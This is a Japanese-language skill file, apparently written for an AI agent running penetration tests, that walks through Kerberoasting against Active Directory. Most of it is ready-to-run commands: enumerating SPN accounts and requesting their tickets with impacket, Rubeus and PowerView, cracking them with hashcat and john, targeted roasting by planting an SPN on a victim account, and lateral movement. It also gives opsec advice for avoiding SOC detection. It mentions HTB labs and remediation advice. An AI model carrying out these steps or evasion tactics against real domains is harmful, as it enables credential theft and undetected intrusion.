# Kerberoasting Attack

`system` の Phase 4 から呼ばれる、SPN 持ち service account の TGS-REP 取得と offline crack。検出視点は別 skill `detecting-kerberoasting-attacks` を参照。

## いつ切替えるか

- AD 環境で foothold (一般 user) 取得後、service account の hash を取得したい
- `references/ad-acl-abuse.md` の発見 path に Kerberoast が含まれる
- HTB AD 系 box

## Phase 1 — 仕組み概要

```
service account に SPN (Service Principal Name) が設定されると、
任意 domain user が KDC に対して該当 service の TGS を要求できる。
TGS-REP の中の chunk は service account の password から派生した key で署名される。
attacker は TGS を offline crack して password を取得。

RC4-HMAC (legacy, 弱い) の hash は最も crackable
AES-128-HMAC-SHA1-96 / AES-256-HMAC-SHA1-96 (modern) は強いが crack 可
```

## Phase 2 — SPN 列挙

```bash
# impacket-GetUserSPNs (Linux)
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc> -request

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# PowerView
Get-DomainUser -SPN | select samaccountname,serviceprincipalname,memberof

# native cmd
setspn -Q */*
```

`-request` で 全 SPN-set user の TGS を一括取得。

## Phase 3 — hash format

impacket / Rubeus 出力は hashcat format `$krb5tgs$<etype>$*<user>$<realm>$<spn>*$<checksum>$<encrypted>`:

```
etype 23: RC4-HMAC      → hashcat mode 13100
etype 17: AES-128-CTS-HMAC-SHA1-96 → mode 19600
etype 18: AES-256-CTS-HMAC-SHA1-96 → mode 19700
```

## Phase 4 — crack

```bash
hashcat -m 13100 hashes.txt rockyou.txt
hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule
hashcat -m 13100 hashes.txt -a 3 ?u?l?l?l?l?l?l?d?d   # mask
```

GPU 速度: RC4-HMAC は 数億 hash/s、AES は 数千万。短 password / dictionary word が成立しやすい。

```bash
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt
```

## Phase 5 — service account の濫用

crack 成功 → service account の password 取得 → 横展開:

```
- service が走る host への RDP / WinRM
- service account に与えられた特権 (DBA / file admin)
- service が読む config に他 credential 散らばる
- service 経由で別 service の権限取得 (delegation)
```

## Phase 6 — Targeted Kerberoasting

任意 domain user に SPN を一時的に追加できる場合 (ACL に GenericWrite):

```
PowerView Set-DomainObject -Identity <victim> -Set @{serviceprincipalname='dummy/dummy'}
GetUserSPNs <victim>     # TGS 取得
PowerView Set-DomainObject -Identity <victim> -Clear serviceprincipalname  # 後始末
```

## Phase 7 — opsec

```
- 全 SPN を一括取得すると 4769 event 大量 → SOC 検知
- specific user に絞り、AS / TGS 区別せず混ぜる
- AES のみ要求して RC4 を avoid (Roast 兆候減)
- working hour に合わせる
```

## Phase 8 — レポート

```
- 取得 SPN list / 該当 service account
- crack 成功 / 失敗 / password 強度評価
- 影響評価 (取得 service 権限)
- 推奨 (long random password / gMSA / AES-only / monitoring 4769 + suspicious flag)
```

## Tools

```
impacket-GetUserSPNs / Rubeus / PowerView
hashcat / john
NetExec
WebFetch
Bash (sandbox)
```
